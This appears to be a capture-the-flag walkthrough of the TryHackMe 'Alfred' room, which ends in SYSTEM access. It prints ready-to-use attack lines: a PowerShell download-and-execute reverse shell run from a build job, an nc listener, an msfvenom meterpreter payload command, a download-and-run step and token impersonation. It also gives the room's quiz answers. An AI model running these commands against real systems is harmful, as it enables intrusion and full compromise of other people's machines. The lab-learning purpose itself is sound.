## Alfred | TryHackMe

This is the link for the room [Alfred](https://tryhackme.com/room/alfred)

<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/953f1e4a27c7e04130b824ec1bc8e159.png" width="200px" align="center">

---
Let's go!

`nmap -sC -sV -p- -T4 {IP}`

-sC = Run the default script.

-sV = Version of services.

-p- = Checking for all port.

-T4 = Scanning speed.

This is the result for the scanning with nmap tools.

<img src="https://user-images.githubusercontent.com/67650329/193412394-5900ea63-979f-44a0-a723-217e5b828f10.png" width="400px" align="center">

**How many ports are open? (TCP only)**

**Answer: 3**

This is the login page for this website.

<img src="https://user-images.githubusercontent.com/67650329/193412491-6221874c-3b45-41d9-abd0-0a522e6004f7.png" width="400px" align="center">

You can try most commond Username and Password [Wikipedia](https://en.wikipedia.org/wiki/List_of_the_most_common_passwords)

**What is the username and password for the log in panel(in the format username:password)**

**Answer: admin:admin**

We can exploring the dashboard to find the vulnerability.

And after take a few minutes. I can write some script on there.

Go to New Item -> Freestyle project -> Add build step -> Execute Windows batch command

Script:

-> `powershell iex (New-Object Net.WebClient).DownloadString('http://{your_ip}:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {your_ip} -Port {port}`

<img src="https://user-images.githubusercontent.com/67650329/193412665-029b5338-b1b9-4392-926d-e6ab83f3ccf4.png" width="400px" align="center">

Before you apply the script you must running listener.

`python3 -m http.server`

`nc -lvnp 4443`

After you run the listener you can Apply and Done.

Click `Build Now` to run the script.

<img src="https://user-images.githubusercontent.com/67650329/193412804-ae102476-01ed-478c-a43e-7839cdbc62f0.png" width="400px" align="center">

And you can see your listener reply your script.

<img src="https://user-images.githubusercontent.com/67650329/193412895-7d80e964-4b29-4f5b-a3bd-f416f0728287.png" width="400px" align="center">

So you are inside the machine.

<img src="https://user-images.githubusercontent.com/67650329/193412953-477970cc-ed4c-4960-b85f-7b68cffb1f0f.png" width="400px" align="center">

Get the user.txt on `Bruce Desktop`

<img src="https://user-images.githubusercontent.com/67650329/193413182-acde4d5a-c35e-48a8-8a2d-9b954131716c.png" width="400px" align="center">

After we get user Bruce, we can exploit user Administrator.

We use metasploit to baypass user Administrator.

You can download this Shell first.

-> `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe`

<img src="https://user-images.githubusercontent.com/67650329/193413413-91187ff5-6b69-465b-9f31-9e04534d37af.png" width="400px" align="center">

**What is the final size of the exe payload that you generated**

**Answer: 73802**

Run the Metasploit.

<img src="https://user-images.githubusercontent.com/67650329/193413534-c2c30c22-8643-4ab5-a3bf-7b6553c6718b.png" width="400px" align="center">

LHOST -> Local Host [Your_IP]

LPORT -> Local Port [Your_Port]

PAYLOAD -> Selected Script

After you write all the requirements you can write `run/exploit`

<img src="https://user-images.githubusercontent.com/67650329/193413692-438f3547-d7dc-4d8b-80f4-e5784194e60e.png" width="400px" align="center">

Download the shell on the Bruce machine with this script:

-> `powershell "(New-Object System.Net.WebClient).Downloadfile('http://{your_ip}:8000/shell-name.exe','shell-name.exe')"`

After you download the shell on Bruce machine you must start the shell.

`Start-Process "shell-name.exe"`

<img src="https://user-images.githubusercontent.com/67650329/193413922-f6c145d3-8e1c-4fbe-894d-83dc2881466e.png" width="400px" align="center">

And you get into the meterpreter.

<img src="https://user-images.githubusercontent.com/67650329/193414100-1873f1f9-7ca2-4212-8f3c-6656eaf182b4.png" width="400px" align="center">

**To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token. What is the output when you run the getuid command?**

**Answer: NT AUTHORITY\SYSTEM**

You can get root on `C:\Windows\System32\config`

<img src="https://user-images.githubusercontent.com/67650329/193414128-1e240e89-a0dd-4c0e-92ee-88a76efd65ae.png" width="400px" align="center">

---
